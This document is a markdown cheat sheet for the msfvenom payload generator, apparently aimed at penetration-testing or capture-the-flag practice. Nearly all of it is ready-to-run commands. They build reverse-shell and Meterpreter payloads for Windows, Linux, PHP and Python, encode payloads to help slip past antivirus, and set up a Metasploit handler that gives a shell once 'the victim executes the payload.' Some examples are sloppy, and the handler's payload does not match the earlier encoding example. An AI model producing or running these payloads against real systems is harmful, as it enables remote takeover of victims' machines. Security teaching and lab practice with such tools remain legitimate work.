## 🧪 What is msfvenom?
msfvenom is a tool used to create custom payloads in different formats (e.g. .exe, .php, .py, .elf, etc.).
---

## 🧪 msfvenom Cheat Sheet – Table of Contents

- 🧪 [What is msfvenom?](#what-is-msfvenom)
- 🎯 [What Does msfvenom Do?](#what-does-msfvenom-do)
- 📌 [Basic Syntax](#basic-syntax)
- 📌 [Example](#example)
- 🔹 [Common Examples](#common-examples)
- 💻 [Windows Reverse Shell (EXE)](#windows-reverse-shell-exe)
- 🐧 [Linux Reverse Shell (ELF)](#linux-reverse-shell-elf)
- 🌐 [PHP Reverse Shell](#php-reverse-shell)
- 🐍 [Python Reverse Shell](#python-reverse-shell)
- 📦 [List Payloads](#list-payloads)
- 🧾 [List Output Formats](#list-output-formats)
- 🌀 [Encoding Payloads](#encoding-payloads)
- 🎯 [Catching the Payload (Metasploit Handler)](#catching-the-payload-metasploit-handler)
- ✅ [Summary](#summary)


---
## 🎯 What Does msfvenom Do?
Lets you generate payloads (like reverse shells or Meterpreter)

Lets you choose output format (`e.g.` `EXE` for Windows, `ELF` for Linux, `RAW` for scripting)

Supports encoding payloads 

---

## 📌 Basic Syntax

```msfvenom -p <payload> LHOST=<your-ip> LPORT=<your-port> -f <format> > <output-file>```
Example

```msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw > shell.php```

This command automatically creates the file shell.php in the directory where you are currently.

Explataiton  ⬆️

| Argument           | Description   ⬆️⬆️                                                              |
|--------------------|-----------------------------------------------------------------------------|
| `-p <payload>`      | Payload type (e.g. `windows/meterpreter/reverse_tcp`)                      |
| `LHOST=<your-ip>`   | Your IP address (listener / attacker machine)                              |
| `LPORT=<your-port>` | Listening port on your machine                                              |
| `-f <format>`       | Format of output file (e.g. `exe`, `elf`, `raw`, `apk`, `py`)              |
| `> <output-file>`   | Redirects the payload to a file (e.g. `shell.exe`)                         |

---

#### 📌 Example

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > shell.exe
```

---

##🔹 Common Examples

- Windows Reverse Shell (EXE file)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f exe > shell.exe
```
- Linux Reverse Shell (.elf)
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf > shell.elf
```

```chmod +x shell.elf  # Make it executable
```
- PHP Reverse Shell
```
msfvenom -p php/reverse_php LHOST=10.10.X.X LPORT=4444 -f raw > shell.php
```
You must add:
```
<?php
// shell code here
?>
```
- Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=4444 -f raw > shell.py
```

---

-🔹 List Payloads

msfvenom -l payloads
-🔹 List Output Formats


msfvenom --list formats
Examples: exe, elf, raw, php, asp, py, war, c, rb, bash

-🔹 Optional: Encoding Payloads
Encoders change how the payload looks. They do not guarantee AV bypass but may help.


msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X -f raw -e php/base64
-🔹 Catching the Payload
To receive the connection, set up the handler in Metasploit:



use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.10.X.X
set LPORT 4444
run
When the victim executes the payload, you get a shell.

## ✅ Summary
Tool	Purpose
msfvenom	Generates custom payloads in multiple formats
-p	Choose payload
LHOST	Your IP (listener)
LPORT	Your port
-f	Output format
>	Save to file
